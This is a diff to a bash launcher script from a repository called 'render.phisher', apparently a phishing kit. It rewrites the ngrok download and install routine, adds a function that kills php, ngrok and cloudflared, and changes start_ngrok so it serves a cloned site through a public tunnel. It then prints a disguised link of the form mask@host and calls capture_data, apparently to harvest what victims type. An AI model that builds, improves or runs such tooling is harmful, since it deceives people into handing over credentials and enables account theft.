@@ -208,6 +208,19 @@ kill_pid() {
 	done
 }
 
+## Kill extra running process
+kill_pid_extra() {
+	if [[ `pidof php` ]]; then
+		killall php > /dev/null 2>&1
+	fi
+	if [[ `pidof ngrok` ]]; then
+		killall ngrok > /dev/null 2>&1
+	fi
+	if [[ `pidof cloudflared` ]]; then
+		killall cloudflared > /dev/null 2>&1
+	fi
+}
+
 # Check for new update
 check_update() {
   local release_url='https://api.github.com/repos/render437/render.phisher/releases/latest'
@@ -369,6 +382,25 @@ download() {
 	fi
 }
 
+## Download Ngrok
+download_ngrok() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 2>&1
+	if [[ -e "$file" ]]; then
+		unzip "$file" > /dev/null 2>&1
+		mv -f ngrok .server/ngrok > /dev/null 2>&1
+		rm -rf "$file" > /dev/null 2>&1
+		chmod +x .server/ngrok > /dev/null 2>&1
+	else
+		echo -e "\n${RED}[${PINK}!${RED}]${RED} Error occured, Install Ngrok manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
@@ -407,43 +439,24 @@ install_localxpose() {
 	fi
 }
 
-## Install Ngrok
+## Install ngrok
 install_ngrok() {
-    if command -v ngrok >/dev/null 2>&1; then
-        echo -e "\n${GREEN} ngrok already installed."
-        return
-    fi
+	if [[ -e ".server/ngrok" ]]; then
+		echo -e "\n${PINK}[${PINK}+${PINK}]${PINK} Ngrok already installed."
+	else
+		echo -e "\n${PINK}[${WHITE}+${PINK}]${CYAN} Installing ngrok..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
+		else
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
+		fi
+	fi
 
-    echo -e "\n${CYAN} Installing ngrok...${WHITE}"
-
-    ARCH=$(uname -m)
-
-    # Pick correct binary for Intel or ARM Chromebooks
-    if [[ "$ARCH" == "x86_64" ]]; then
-        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz"
-    elif [[ "$ARCH" == "aarch64" || "$ARCH" == arm* ]]; then
-        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz"
-    else
-        echo -e "${RED} Unsupported CPU architecture: $ARCH"
-        return 1
-    fi
-
-    mkdir -p .server
-    cd .server
-
-    # Download & extract
-    wget -q "$NGROK_URL" -O ngrok.tgz
-    tar -xvf ngrok.tgz >/dev/null
-    rm ngrok.tgz
-
-    # Move ngrok into .server directory
-    mv ngrok loc-ngrok
-    chmod +x loc-ngrok
-
-    cd ..
-
-    echo -e "${GREEN} ngrok installed successfully (anonymous mode)."
-    echo -e "${YELLOW} You can use it with: ${WHITE}.server/loc-ngrok http 8080"
 }
 
 
@@ -647,59 +660,26 @@ start_localhost() {
 	capture_data
 }
 
+
+
 ## Start ngrok
-ngrok_auth() {
-	./.server/ngrok authtoken -help > /dev/null 2>&1 &
-	sleep 1
-
-	auth_f="$HOME/.ngrok2/ngrok.yml"
-
-	# Check if ngrok is configured (authtoken exists in config file)
-	if ! grep -q "authtoken:" "$auth_f"; then
-		echo -e "\n\n${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
-		sleep 3
-		read -p "${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
-		[[ $ngrok_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
-		} || {
-			# Create .ngrok2 directory if it doesn't exist
-			mkdir -p "$HOME/.ngrok2"
-
-			# Write the authtoken to the ngrok.yml file
-			echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
-			echo -e "\n${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
-		}
-	fi
-}
-
 start_ngrok() {
-	cusport #Assuming this sets $HOST and $PORT
-	ngrok_auth # Ensure authtoken is configured
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
-	echo -e "\n${ORANGE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to ALEX BIEBER (https://github.com/alexbieber)
+    else
+        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+    fi
 
-	echo -ne "\n\n${CYAN} Starting Ngrok tunnel..."
-
-	if [[ `command -v termux-chroot` ]]; then
-    	sleep 2 && termux-chroot ./.server/ngrok tcp $PORT &
-	else
-		sleep 2 && ./.server/ngrok tcp $PORT &
-	fi
-
-
-	sleep 5 #Give ngrok time to start
-
-	#Find the ngrok URL (you may need to adjust the grep if the output format changes)
-	ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-
-
-	if [[ -z "$ngrok_url" ]]; then
-		echo -e "\n${RED} Failed to retrieve Ngrok URL. Check Ngrok logs or try again.${RED}"
-	else
-		custom_url "$ngrok_url"
-		capture_data
-	fi
-
+	{ sleep 8; clear; banner_small; }
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url1=${ngrok_url#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	capture_data
 }
 
 ## Tunnel selection
@@ -1033,6 +1013,7 @@ main_menu() {
 
 ## Main
 kill_pid
+kill_pid_extra
 dependencies
 check_status
 install_ngrok
